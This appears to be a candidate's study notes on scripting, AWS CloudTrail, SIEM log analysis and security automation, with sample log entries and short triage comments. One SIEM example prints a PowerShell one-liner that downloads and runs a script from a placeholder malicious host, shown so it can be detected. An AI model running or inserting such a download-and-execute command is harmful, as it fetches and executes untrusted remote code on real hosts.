## 1. PowerShell & Bash: Automating system configurations.  

With my experience in Bash scripting and PowerShell gained through both self directed learning and academic work I can efficiently take on new tasks in this area. This foundation allows me to approach challenges with flexibility and develop multiple effective solutions to meet the requirements at hand.

With Experience with physical audits whilst working at costa this will assist me in using powershell to produce evidence required for audits.

## 2. Python (Boto3) Managing AWS resources via scripts  

With my current knowledge of Python scripting and its capabilities I can adapt to Boto3 efficiently and my understanding of Azure fundamentals will translate well to AWS, helping me learn the platform more quickly.

## 3. Log Analysis: CloudTrail and SIEM Examples

### AWS CloudTrail

AWS Cloudtrail is a logging and auditing service in which records all API activity within an AWS environment which helps with detcting any unusual or malicous behaviour, provide evidence for compliance and audits and investigate security incidents and more.

Overall, CloudTrail gives organisations greater visibility and control over their security measures.

#### Pros

Quick and easy

Good for one-off checks

#### Cons

Only stores 90 days of history (unless logs are delivered to S3).

### AWS CloudTrail Lake

AWS Cloudtrail Lake is a feature which stores CloudTrail events within an event data store and allows for users to run SQL based queries against them, This is especially helpful for investigation, threat hunting and multiple log trails.

#### Pros

Powerful SQL-based searching

Works across multiple regions

Can retain logs for years

#### Cons

Costs more than standard CloudTrail

Needs an event data store


### Log Analysis Examples

### Example 1 --- Detecting Console Logins from New IPs

``` json
{
  "eventName": "ConsoleLogin",
  "sourceIPAddress": "45.91.121.10",
  "userIdentity": {
    "type": "IAMUser",
    "userName": "admin"
  },
  "responseElements": {
    "ConsoleLogin": "Success"
  }
}
```

**Analysis:** Login from a new IP. Check if expected or credentials
compromised.

------------------------------------------------------------------------

### Example 2 --- Detecting Creation of New IAM Users

``` json
{
  "eventName": "CreateUser",
  "userIdentity": {
    "arn": "arn:aws:iam::123456789012:user/admin"
  },
  "requestParameters": {
    "userName": "temp-support-user"
  }
}
```

**Analysis:** New IAM user created. Verify authorisation and check MFA.

------------------------------------------------------------------------

### Example 3 --- S3 Bucket Public Access Change

``` json
{
  "eventName": "PutBucketAcl",
  "requestParameters": {
    "bucketName": "finance-data",
    "AccessControlList": "public-read"
  }
}
```

**Analysis:** S3 bucket made public. Immediate remediation required.

------------------------------------------------------------------------

### Example 4 --- API Key Used from an Unusual Country

``` json
{
  "eventName": "ListBuckets",
  "sourceIPAddress": "185.23.20.4",
  "awsRegion": "eu-west-1",
  "userIdentity": {
    "accessKeyId": "AKIAEXAMPLE"
  },
  "additionalEventData": {
    "Country": "Russia"
  }
}
```

**Analysis:** API call from unexpected country. Possible key compromise.

------------------------------------------------------------------------

### SIEM Log Analysis Examples

### Example 1 --- Multiple Failed Logins Followed by a Success

    Failed login for user 'p.thomas' from 10.1.2.40
    Failed login for user 'p.thomas' from 10.1.2.40
    Failed login for user 'p.thomas' from 10.1.2.40
    Successful login for user 'p.thomas' from 10.1.2.40

**Analysis:** Possible brute-force or password guessing.

------------------------------------------------------------------------

### Example 2 --- Privilege Escalation in Windows Logs

    Event ID: 4670
    Object permissions changed
    User: j.smith
    Object: Domain Admins group

**Analysis:** Privilege escalation. Check change authorisation.

------------------------------------------------------------------------

### Example 3 --- Suspicious PowerShell Command Execution

    Event ID 4104
    PowerShell command executed:
    IEX(New-Object Net.WebClient).DownloadString("http://malicious.example/payload.ps1")

**Analysis:** Likely malware. Block and isolate the host.

------------------------------------------------------------------------

### Example 4 --- Unexpected Outbound Traffic Spike

    Outbound traffic to IP 198.51.100.44 increased by 500MB in 2 minutes.
    Process: adobeupdate.exe
    Destination port: 443

**Analysis:** Potential data exfiltration disguised as legitimate
traffic.

------------------------------------------------------------------------

### Example 5 --- Suspicious DNS Queries

    Query: hfu39a9abdj.example
    Client: 10.5.2.23
    Type: TXT

**Analysis:** Possible DNS tunnelling. Investigate endpoint.

## 4. Security Automation: Triggering Alerts

Security automation detects malicious and suspicious behaviour and generates alerts to aid in faster incident response, tools which are commonly used for this are: AWS GuardDuty, Splunk, CrowdStrike Falcon and Microsoft Sentinel.

### Typical alert scenarios

1. Suspicious Login (M365 / Azure AD)  
   - Trigger: "Impossible travel" — same user logs in from two countries within a short window.  
   - Automated actions:  
     - Create incident/ticket (ServiceNow).  
     - Post alert to SOC channel (Teams/Slack).  
     - Enrich alert with user/context and recent activity.

2. AWS GuardDuty detections  
   - Example detections:  
     - API key used from a TOR exit node.  
     - EC2 instance communicating with a known malware domain.  
   - Automated actions:  
     - Forward alert to Security Hub and SIEM (Splunk).  
     - Send notification via SNS (email/SMS).  
     - Create incident record for triage.

3. Firewall automation  
   - Trigger: repeated port scanning from an IP or subnet.  
   - Automated actions:  
     - Block offending IP via firewall rule.  
     - Log event to SIEM.  
     - Notify SOC and open remediation ticket.

## 5. Security Automation: Patching

Automation handles scanning, prioritisation and deployment of patches which can be customised to the company's specification, some common tools for taking out this task are: AWS Systems Manager Patch Manager, Azure Update Manager and Automox.

### Example workflows

- Weekly vulnerability report  
  - Process: Nessus/Qualys scan → export top vulnerabilities, new CVEs, patch-priority list.  
  - Output: PDF/CSV emailed to security and ops teams.

- SIEM daily security summary  
  - Process: Microsoft Sentinel compiles failed logins, malware detections, privilege escalations.  
  - Output: Daily digest email (e.g., 09:00) to distribution list.

- CloudTrail compliance report (AWS)  
  - Process: CloudTrail Lake runs scheduled SQL queries for IAM changes, S3 permission changes, console logins.  
  - Output: Results saved to S3 or sent via SNS for downstream processing.